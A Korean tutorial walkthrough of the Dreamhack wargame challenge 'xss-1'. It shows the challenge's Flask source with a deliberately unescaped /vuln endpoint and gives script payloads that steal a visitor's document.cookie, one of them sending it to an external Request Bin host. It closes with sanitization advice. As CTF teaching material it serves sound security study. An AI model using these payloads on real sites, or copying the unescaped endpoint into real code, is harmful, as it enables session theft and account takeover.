## 들어가며
이번 강의에서는 XSS 취약점이 존재하는 워게임 문제인 [xss-1](https://dreamhack.io/wargame/challenges/28/)을 풀어보면서 다른 사용자의 클라이언트에 저장된 쿠키를 탈취해보는 실습을 진행한다. 

---
### 배경 지식
이번 문제는 Python의 Flask 프레임워크를 통해 구현되었으며, XSS 기법으로 다른 사용자의 쿠키를 탈취해야 하기 때문에 다른 사용자가 방문하는 시나리오가 필요해 Selenium을 통해 구현했다. 

[셀레늄(Selenium)](https://selenium-python.readthedocs.io/getting-started.html)은 웹 애플리케이션 테스팅에 사용하는 Python 모듈로, API를 통해 웹 드라이버(Chrome, Safari 등)를 사용할 수 있으며 요청과 응답만을 처리하는 라이브러리와 다르게 응답에 포함된 JavaScript, CSS 등의 웹 리소스를 웹 드라이버를 사용해 처리하여 웹 브라우저를 통해 페이지를 방문하는 것과 비슷한 역할을 한다. 

---
### 문제 목표 및 기능 요약
xss-1 문제의 목표는 XSS를 통해 임의 사용자의 쿠키를 탈취하는 것이며, 문제에서는 다음 네 개의 페이지를 제공한다. 

- `/`: 인덱스 페이지
- `/vuln`: 사용자가 입력한 값을 출력
- `/memo`: 사용자가 메모를 남길 수 있으며, 작성한 메모를 출력
- `/flag`: 사용자가 전달한 URL에 임의의 사용자가 접근하도록 하며, **해당 사용자의 쿠키에는 Flag가 존재**

---
## 웹 서비스 분석
아래 코드는 문제 페이지에서 다운로드 받을 수 있는 코드 중 *app.py*에 해당하는 코드이다. 

```python
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os


app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
	FLAG = open('./flag.txt', 'r').read()
except:
	FLAG = '[**FLAG**]'


def read_url(url, cookie={'name':'name', 'value':'value'}):
	cookie.update({'domain':'127.0.0.1'})
	try:
		service = Service(executable_path='/chromedriver')
		options = webdriver.ChromeOptions()
		for _ in [
			'headless',
			'window-size=1920x1080',
			'disable-gpu',
			'no-sandbox',
			'disable-dev-shm-usage',
		]:
			options.add_argument(_)
		driver = webdriver.Chrome(service=service, options=options)
		driver.implicitly_wait(3)
		driver.set_page_load_timeout(3)
		driver.get('http://127.0.0.1:8000/')
		driver.add_cookie(cookie)
		driver.get(url)
	except Exception as e:
		driver.quit()
		return False
	driver.quit()
	return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
	url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
	return read_url(url, cookie)
   
@app.route('/')
def index():
	return render_template('index.html')


@app.route('/vuln')
def vuln():
	param = request.args.get('param', '')
	return param


@app.route('/flag', methods=['GET', 'POST'])
def flag():
	if request.method == 'GET':
		return render_template('flag.html')
	elif request.method == 'POST':
		param = request.form.get('param')
		if not check_xss(param, {'name':'flag', 'value':FLAG.strip()}):
			return '<script>alert("wrong??");history.go(-1);</script>'
		return '<script>alert("good");history.go(-1);</script>'


memo_text = ''


@app.route('/memo')
def memo():
	global memo_text
	text = request.args.get('memo', '')
	memo_text += text + '\n'
	return render_template('memo.html', memo=memo_text)


app.run(host='0.0.0.0', port=8000)
```

이 때 각각의 함수는 다음의 역할을 수행한다. 

- `vuln` - 사용자가 전달한 `param` 파라미터의 값을 출력
- `memo` - 사용자가 전달한 `memo` 파라미터의 값을 `render_template` 함수를 통해 기록
- `flag` - 메소드에 따라 요청마다 다른 기능을 수행
	- `GET` - 사용자에게 URL을 입력받는 페이지를 제공
	- `POST` - `param` 파라미터의 값과 쿠키에 FLAG를 포함해 `check_xss` 함수를 호출하며, `check_xss` 함수는 `read_url` 함수를 호출해 `vuln` 엔드포인트에 접속

---
## 취약점 분석
`vuln`과 `memo` 엔드포인트는 사용자의 입력값을 페이지에 출력하는데, 이 때 `vuln` 함수에서 사용자가 입력한 값을 페이지에 그대로 출력하기 때문에 XSS가 발생하게 된다. 

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

(단, `memo` 함수에서는 `render_template` 함수를 호출해 *memo.html*을 출력하고, `render_template` 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티코드로 변환해서 저장하기 때문에 XSS가 발생하지 않는다.)

---
## 익스플로잇
문제를 해결하기 위해서 `/vuln` 엔드포인트에서 발생하는 XSS 취약점을 통해 임의 사용자의 쿠키를 탈취해야 한다. 탈취한 쿠키를 전달받기 위해서는 **외부에서 접근 가능한 웹 서버**를 사용하거나 문제에서 제공하는 **memo** 엔드포인트를 사용할 수 있다. 

다음은 공격에 사용할 수 있는 속성에 대한 설명이다. 

- `location.href` - 전체 URL을 반환받거나, URL을 업데이트할 수 있는 속성
- `document.cookie` - 해당 페이지에서 사용하는 쿠키를 읽고 쓸 수 있는 속성

---
### 쿠키 탈취
크게 두 가지의 방법으로 임의 사용자의 쿠키를 탈취할 수 있다. 

**memo 페이지 사용**
**flag** 엔드포인트에서 다음의 코드를 빈 칸에 입력하면 **memo** 페이지에서 쿠키 정보를 확인할 수 있다. 

```html
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

**웹 서버 사용**
외부에서 접근 가능한 웹 서버를 통해서도 탈취한 쿠키를 확인할 수 있으며, 외부에서 접근 가능한 웹 서버가 없다면 [Dreamhack에서 제공하는 Dreamhack Tools Service](https://tools.dreamhack.games/)를 사용할 수 있다. 해당 서비스에서 제공하는 Request Bin 기능은 사용자의 접속 기록을 저장하기 때문에 해당 정보를 확인할 수 있다. Request Bin 버튼을 클릭하면 랜덤한 URL이 생성되며, 해당 URL에 접속한 기록을 저장한다. 

**flag** 기능에서 다음과 같은 익스플로잇 코드를 입력하면, 아래와 같이 접속 기록에 포함된 FLAG를 볼 수 있다. 

```html
<script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>
```

![[Pasted image 20260126233044.png]]

---
## 마치며
이번 강의에서는 xss-1 문제를 통해 사용자의 입력값을 별다른 검증 없이 페이지에 출력할 경우 발생할 수 있는 문제점에 대해 알아보았다. XSS 공격은 주로 사용자의 입력값이 출력되는 페이지에서 발생하며, 해당 공격을 통해 타 사용자의 브라우저에 저장된 쿠키 및 세션 정보를 탈취할 수 있다. 

이런 문제점은 악성 태그를 필터링하는 [HTML Sanitization (HTML 정제)](https://en.wikipedia.org/wiki/HTML_sanitization)를 사용하거나 엔티티 코드로 치환하는 방법을 통해 해결할 수 있다. 
